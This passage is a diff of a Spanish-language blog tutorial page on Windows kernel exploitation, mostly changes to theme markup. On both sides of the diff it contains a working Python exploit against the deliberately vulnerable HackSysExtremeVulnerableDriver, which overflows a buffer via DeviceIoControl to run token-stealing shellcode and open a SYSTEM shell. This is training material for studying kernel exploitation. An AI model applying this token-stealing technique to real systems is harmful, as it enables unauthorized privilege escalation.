-</span></span><span style="display:flex;"><span>  shellcode <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x8b\x40\x50</span><span style="color:#e6db74">&#39;</span>                 <span style="color:#75715e"># mov eax, dword ptr [eax + 0x50]</span>
-</span></span><span style="display:flex;"><span>  shellcode <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x89\xc1</span><span style="color:#e6db74">&#39;</span>                     <span style="color:#75715e"># mov ecx, eax</span>
-</span></span><span style="display:flex;"><span>  shellcode <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\xba\x04\x00\x00\x00</span><span style="color:#e6db74">&#39;</span>         <span style="color:#75715e"># mov edx, 4</span>
-</span></span><span style="display:flex;"><span>  shellcode <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x8b\x80\xb8\x00\x00\x00</span><span style="color:#e6db74">&#39;</span>     <span style="color:#75715e"># mov eax, dword ptr [eax + 0xb8]</span>
-</span></span><span style="display:flex;"><span>  shellcode <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x2d\xb8\x00\x00\x00</span><span style="color:#e6db74">&#39;</span>         <span style="color:#75715e"># sub eax, 0xb8</span>
-</span></span><span style="display:flex;"><span>  shellcode <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x39\x90\xb4\x00\x00\x00</span><span style="color:#e6db74">&#39;</span>     <span style="color:#75715e"># cmp dword ptr [eax + 0xb4], edx</span>
-</span></span><span style="display:flex;"><span>  shellcode <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x75\xed</span><span style="color:#e6db74">&#39;</span>                     <span style="color:#75715e"># jne 0x1014</span>
-</span></span><span style="display:flex;"><span>  shellcode <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x8b\x90\xf8\x00\x00\x00</span><span style="color:#e6db74">&#39;</span>     <span style="color:#75715e"># mov edx, dword ptr [eax + 0xf8]</span>
-</span></span><span style="display:flex;"><span>  shellcode <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x89\x91\xf8\x00\x00\x00</span><span style="color:#e6db74">&#39;</span>     <span style="color:#75715e"># mov dword ptr [ecx + 0xf8], edx</span>
-</span></span><span style="display:flex;"><span>  shellcode <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x61</span><span style="color:#e6db74">&#39;</span>                         <span style="color:#75715e"># popal</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>  shellcode <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x5D</span><span style="color:#e6db74">&#39;</span>                         <span style="color:#75715e"># pop ebp</span>
-</span></span><span style="display:flex;"><span>  shellcode <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\xC2\x08\x00</span><span style="color:#e6db74">&#39;</span>                 <span style="color:#75715e"># ret 0x8</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>  print(<span style="color:#e6db74">&#34;[*] Allocating RWX memory&#34;</span>)
-</span></span><span style="display:flex;"><span>  ptrMemory <span style="color:#f92672">=</span> kernel32<span style="color:#f92672">.</span>VirtualAlloc(NULL,
-</span></span><span style="display:flex;"><span>                                    len(shellcode),
-</span></span><span style="display:flex;"><span>                                    (MEM_COMMIT <span style="color:#f92672">|</span> MEM_RESERVE),
-</span></span><span style="display:flex;"><span>                                    PAGE_EXECUTE_READWRITE)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>  print(<span style="color:#e6db74">&#34;[*] Creating a char array to house shellcode&#34;</span>)
-</span></span><span style="display:flex;"><span>  buffer <span style="color:#f92672">=</span> (c_char <span style="color:#f92672">*</span> len(shellcode))<span style="color:#f92672">.</span>from_buffer(shellcode)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>  print(<span style="color:#e6db74">&#34;[*] Copying shellcode array into RWX memory&#34;</span>)
-</span></span><span style="display:flex;"><span>  kernel32<span style="color:#f92672">.</span>RtlMoveMemory(c_int(ptrMemory), buffer, len(shellcode))
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>  ptrShellcode <span style="color:#f92672">=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#34;&lt;L&#34;</span>, ptrMemory)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>  buffer  <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">2080</span>
-</span></span><span style="display:flex;"><span>  buffer <span style="color:#f92672">+=</span> ptrShellcode
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>  print(<span style="color:#e6db74">&#34;[*] Calling control code 0x222003</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
-</span></span><span style="display:flex;"><span>  kernel32<span style="color:#f92672">.</span>DeviceIoControl(hHEVD,
-</span></span><span style="display:flex;"><span>                           <span style="color:#ae81ff">0x222003</span>,
-</span></span><span style="display:flex;"><span>                           buffer,
-</span></span><span style="display:flex;"><span>                           len(buffer),
-</span></span><span style="display:flex;"><span>                           NULL,
-</span></span><span style="display:flex;"><span>                           <span style="color:#ae81ff">0x00</span>,
-</span></span><span style="display:flex;"><span>                           byref(c_ulong()),
-</span></span><span style="display:flex;"><span>                           NULL)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>  os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#34;cmd.exe&#34;</span>)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>main()
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">struct</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">ctypes</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">GENERIC_READ</span>           <span class="o">=</span> <span class="mh">0x80000000</span>
+</span></span><span class="line"><span class="cl"><span class="n">GENERIC_WRITE</span>          <span class="o">=</span> <span class="mh">0x40000000</span>
+</span></span><span class="line"><span class="cl"><span class="n">OPEN_EXISTING</span>          <span class="o">=</span> <span class="mh">0x00000003</span>
+</span></span><span class="line"><span class="cl"><span class="n">FILE_ATTRIBUTE_NORMAL</span>  <span class="o">=</span> <span class="mh">0x00000080</span>
+</span></span><span class="line"><span class="cl"><span class="n">MEM_COMMIT</span>             <span class="o">=</span> <span class="mh">0x00001000</span>
+</span></span><span class="line"><span class="cl"><span class="n">MEM_RESERVE</span>            <span class="o">=</span> <span class="mh">0x00002000</span>
+</span></span><span class="line"><span class="cl"><span class="n">PAGE_EXECUTE_READWRITE</span> <span class="o">=</span> <span class="mh">0x00000040</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">NULL</span> <span class="o">=</span> <span class="kc">None</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="n">kernel32</span> <span class="o">=</span> <span class="n">windll</span><span class="o">.</span><span class="n">kernel32</span>
+</span></span><span class="line"><span class="cl">  <span class="n">hHEVD</span> <span class="o">=</span> <span class="n">kernel32</span><span class="o">.</span><span class="n">CreateFileA</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;</span><span class="se">\\\\</span><span class="s2">.</span><span class="se">\\</span><span class="s2">HackSysExtremeVulnerableDriver&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                               <span class="p">(</span><span class="n">GENERIC_READ</span> <span class="o">|</span> <span class="n">GENERIC_WRITE</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">                               <span class="mh">0x00</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                               <span class="n">NULL</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                               <span class="n">OPEN_EXISTING</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                               <span class="n">FILE_ATTRIBUTE_NORMAL</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                               <span class="n">NULL</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="n">hHEVD</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[-] Failed to get a handle on HackSysExtremeVulnerableDriver</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="n">shellcode</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="c1"># python3 sickle.py -a x86 -v shellcode -p windows/x86/kernel_token_stealer -f python3 -m pinpoint</span>
+</span></span><span class="line"><span class="cl">  <span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x60</span><span class="s1">&#39;</span>                         <span class="c1"># pushal </span>
+</span></span><span class="line"><span class="cl">  <span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x31\xc0</span><span class="s1">&#39;</span>                     <span class="c1"># xor eax, eax</span>
+</span></span><span class="line"><span class="cl">  <span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x64\x8b\x80\x24\x01\x00\x00</span><span class="s1">&#39;</span> <span class="c1"># mov eax, dword ptr fs:[eax + 0x124]</span>
+</span></span><span class="line"><span class="cl">  <span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x8b\x40\x50</span><span class="s1">&#39;</span>                 <span class="c1"># mov eax, dword ptr [eax + 0x50]</span>
+</span></span><span class="line"><span class="cl">  <span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x89\xc1</span><span class="s1">&#39;</span>                     <span class="c1"># mov ecx, eax</span>
+</span></span><span class="line"><span class="cl">  <span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\xba\x04\x00\x00\x00</span><span class="s1">&#39;</span>         <span class="c1"># mov edx, 4</span>
+</span></span><span class="line"><span class="cl">  <span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x8b\x80\xb8\x00\x00\x00</span><span class="s1">&#39;</span>     <span class="c1"># mov eax, dword ptr [eax + 0xb8]</span>
+</span></span><span class="line"><span class="cl">  <span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x2d\xb8\x00\x00\x00</span><span class="s1">&#39;</span>         <span class="c1"># sub eax, 0xb8</span>
+</span></span><span class="line"><span class="cl">  <span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x39\x90\xb4\x00\x00\x00</span><span class="s1">&#39;</span>     <span class="c1"># cmp dword ptr [eax + 0xb4], edx</span>
+</span></span><span class="line"><span class="cl">  <span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x75\xed</span><span class="s1">&#39;</span>                     <span class="c1"># jne 0x1014</span>
+</span></span><span class="line"><span class="cl">  <span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x8b\x90\xf8\x00\x00\x00</span><span class="s1">&#39;</span>     <span class="c1"># mov edx, dword ptr [eax + 0xf8]</span>
+</span></span><span class="line"><span class="cl">  <span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x89\x91\xf8\x00\x00\x00</span><span class="s1">&#39;</span>     <span class="c1"># mov dword ptr [ecx + 0xf8], edx</span>
+</span></span><span class="line"><span class="cl">  <span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x61</span><span class="s1">&#39;</span>                         <span class="c1"># popal</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x5D</span><span class="s1">&#39;</span>                         <span class="c1"># pop ebp</span>
+</span></span><span class="line"><span class="cl">  <span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\xC2\x08\x00</span><span class="s1">&#39;</span>                 <span class="c1"># ret 0x8</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[*] Allocating RWX memory&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="n">ptrMemory</span> <span class="o">=</span> <span class="n">kernel32</span><span class="o">.</span><span class="n">VirtualAlloc</span><span class="p">(</span><span class="n">NULL</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                                    <span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">                                    <span class="p">(</span><span class="n">MEM_COMMIT</span> <span class="o">|</span> <span class="n">MEM_RESERVE</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">                                    <span class="n">PAGE_EXECUTE_READWRITE</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[*] Creating a char array to house shellcode&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="n">buffer</span> <span class="o">=</span> <span class="p">(</span><span class="n">c_char</span> <span class="o">*</span> <span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">))</span><span class="o">.</span><span class="n">from_buffer</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[*] Copying shellcode array into RWX memory&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="n">kernel32</span><span class="o">.</span><span class="n">RtlMoveMemory</span><span class="p">(</span><span class="n">c_int</span><span class="p">(</span><span class="n">ptrMemory</span><span class="p">),</span> <span class="n">buffer</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="n">ptrShellcode</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s2">&#34;&lt;L&#34;</span><span class="p">,</span> <span class="n">ptrMemory</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="n">buffer</span>  <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;A&#34;</span> <span class="o">*</span> <span class="mi">2080</span>
+</span></span><span class="line"><span class="cl">  <span class="n">buffer</span> <span class="o">+=</span> <span class="n">ptrShellcode</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[*] Calling control code 0x222003</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="n">kernel32</span><span class="o">.</span><span class="n">DeviceIoControl</span><span class="p">(</span><span class="n">hHEVD</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                           <span class="mh">0x222003</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                           <span class="n">buffer</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                           <span class="nb">len</span><span class="p">(</span><span class="n">buffer</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">                           <span class="n">NULL</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                           <span class="mh">0x00</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                           <span class="n">byref</span><span class="p">(</span><span class="n">c_ulong</span><span class="p">()),</span>
+</span></span><span class="line"><span class="cl">                           <span class="n">NULL</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s2">&#34;cmd.exe&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">main</span><span class="p">()</span>
 </span></span></code></pre></div><p>Una vez que lo enviemos, somos &ldquo;SYSTEM&rdquo;!</p>
-<p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/poc.gif" alt="alt text"></p>
-<h1 id="recursos">Recursos</h1>
+<p>
+    <figure>
+      <img class="my-0 rounded-md" loading="lazy" src="/0x00-Introduction-To-Windows-Kernel-Exploitation/poc.gif" alt="alt text" />
+      
+    </figure>
+</p>
+
+
+<h1 class="relative group">Recursos 
+    <div id="recursos" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#recursos" aria-label="Anchor">#</a>
+    </span>        
+    
+</h1>
 <pre tabindex="0"><code>https://www.welivesecurity.com/2017/03/27/configure-windbg-kernel-debugging/
 https://microsoft.public.windbg.narkive.com/MamhR9YH/win7-and-kpcr
 https://github.com/LordNoteworthy/windows-internals/blob/master/IRP%20Major%20Functions%20List.md
 https://youtu.be/Ca3dAXDdoz8?si=oN_DsgyLz-Z4fVYL
 </code></pre>
-    </div>
-    <div class="post-footer">
-      
-    </div>
-  </article>
+          
+          
+          
+        </div>
+        
+        
 
-    </main>
-  </body>
+        
+        
+
+          
+      </div>
+     
+      
+      
+        
+        
+          
+          
+        
+      <script>
+        var oid = "views_posts\/0x00-Introducción-a-Windows-Kernel-Explotación.md"
+        var oid_likes = "likes_posts\/0x00-Introducción-a-Windows-Kernel-Explotación.md"
+      </script>
+      
+      
+      <script type="text/javascript" src="/js/page.min.0860cf4e04fa2d72cc33ddba263083464d48f67de06114529043cb4623319efed4f484fd7f1730df5abea0e2da6f3538855634081d02f2d6e920b956f063e823.js" integrity="sha512-CGDPTgT6LXLMM926JjCDRk1I9n3gYRRSkEPLRiMxnv7U9IT9fxcw31q&#43;oOLabzU4hVY0CB0C8tbpILlW8GPoIw=="></script>
+      
+  
+    </section>
+  <footer class="pt-8 max-w-prose print:hidden">
+
+    
+  
+    
+    
+    
+    <div class="pt-8">
+      <hr class="border-dotted border-neutral-300 dark:border-neutral-600" />
+      <div class="flex justify-between pt-3">
+        <span>
+          
+            <a class="flex group mr-3" href="/posts/0x00-introduction-to-windows-kernel-exploitation/">
+              <span
+                class="mr-3 text-neutral-700 group-hover:text-primary-600 ltr:inline rtl:hidden dark:text-neutral dark:group-hover:text-primary-400"
+                >&larr;</span
+              >
+              <span
+                class="ml-3 text-neutral-700 group-hover:text-primary-600 ltr:hidden rtl:inline dark:text-neutral dark:group-hover:text-primary-400"
+                >&rarr;</span
+              >
+              <span class="flex flex-col">
+                <span
+                  class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
+                  >0x00 - Introduction to Windows Kernel Exploitation</span
+                >
+                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
+                  
+                </span>
+              </span>
+            </a>
+          
+        </span>
+        <span>
+          
+            <a class="flex text-right group ml-3" href="/posts/0x01-killing-windows-kernel-mitigations/">
+              <span class="flex flex-col">
+                <span
+                  class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
+                  >0x01 - Killing Windows Kernel Mitigations</span
+                >
+                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
+                  
+                </span>
+              </span>
+              <span
+                class="ml-3 text-neutral-700 group-hover:text-primary-600 ltr:inline rtl:hidden dark:text-neutral dark:group-hover:text-primary-400"
+                >&rarr;</span
+              >
+              <span
+                class="mr-3 text-neutral-700 group-hover:text-primary-600 ltr:hidden rtl:inline dark:text-neutral dark:group-hover:text-primary-400"
+                >&larr;</span
+              >
+            </a>
+          
+        </span>
+      </div>
+    </div>
+  
+
+
+    
+  </footer>
+</article>
+
+      <div id="top-scroller" class="pointer-events-none absolute top-[110vh] bottom-0 w-12 ltr:right-0 rtl:left-0">
+  <a href="#the-top"
+    class="pointer-events-auto sticky top-[calc(100vh-5.5rem)] flex h-12 w-12 mb-16 items-center justify-center rounded-full bg-neutral/50 text-xl text-neutral-700 hover:text-primary-600 dark:bg-neutral-800/50 dark:text-neutral dark:hover:text-primary-400"
+    aria-label="Scroll to top" title="Scroll to top">
+    &uarr;
+  </a>
+</div>
+    </main><footer id="site-footer" class="py-10 print:hidden">
+  
+  
+    
+  
+  <div class="flex items-center justify-between">
+
+    
+    
+    <p class="text-sm text-neutral-500 dark:text-neutral-400">
+      © 2017 Milton Valencia. All Rights Reserved
+    </p>
+    
+
+    
+    
+    <p class="text-xs text-neutral-500 dark:text-neutral-400">
+      
+      
+      Powered by <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500"
+        href="https://gohugo.io/" target="_blank" rel="noopener noreferrer">Hugo</a> &amp; <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500"
+        href="https://blowfish.page/" target="_blank" rel="noopener noreferrer">Blowfish</a>
+    </p>
+    
+
+  </div>
+  <script>
+    
+    mediumZoom(document.querySelectorAll("img:not(.nozoom)"), {
+      margin: 24,
+      background: 'rgba(0,0,0,0.5)',
+      scrollOffset: 0,
+    })
+    
+  </script>
+  
+  
+  <script type="text/javascript" src="/js/process.min.ee03488f19c93c2efb199e2e3014ea5f3cb2ce7d45154adb3399a158cac27ca52831db249ede5bb602700ef87eb02434139de0858af1818ab0fb4182472204a4.js" integrity="sha512-7gNIjxnJPC77GZ4uMBTqXzyyzn1FFUrbM5mhWMrCfKUoMdsknt5btgJwDvh&#43;sCQ0E53ghYrxgYqw&#43;0GCRyIEpA=="></script>
+  
+  
+</footer>
+<div
+  id="search-wrapper"
+  class="invisible fixed inset-0 flex h-screen w-screen cursor-default flex-col bg-neutral-500/50 p-4 backdrop-blur-sm dark:bg-neutral-900/50 sm:p-6 md:p-[10vh] lg:p-[12vh]"
+  data-url="/"
+  style="z-index:500"
+>
+  <div
+    id="search-modal"
+    class="flex flex-col w-full max-w-3xl min-h-0 mx-auto border rounded-md shadow-lg top-20 border-neutral-200 bg-neutral dark:border-neutral-700 dark:bg-neutral-800"
+  >
+    <header class="relative z-10 flex items-center justify-between flex-none px-2">
+      <form class="flex items-center flex-auto min-w-0">
+        <div class="flex items-center justify-center w-8 h-8 text-neutral-400">
+          
+
+  <span class="relative block icon">
+    <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+
+  </span>
+
+
+        </div>
+        <input
+          type="search"
+          id="search-query"
+          class="flex flex-auto h-12 mx-1 bg-transparent appearance-none focus:outline-dotted focus:outline-2 focus:outline-transparent"
+          placeholder="Search"
+          tabindex="0"
+        />
+      </form>
+      <button
+        id="close-search-button"
+        class="flex items-center justify-center w-8 h-8 text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400"
+        title="Close (Esc)"
+      >
+        
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>
+
+  </span>
+
+
+      </button>
+    </header>
+    <section class="flex-auto px-2 overflow-auto">
+      <ul id="search-results">
+        
+      </ul>
+    </section>
+  </div>
+</div>
+
+  </div>
+</body>
+
 </html>
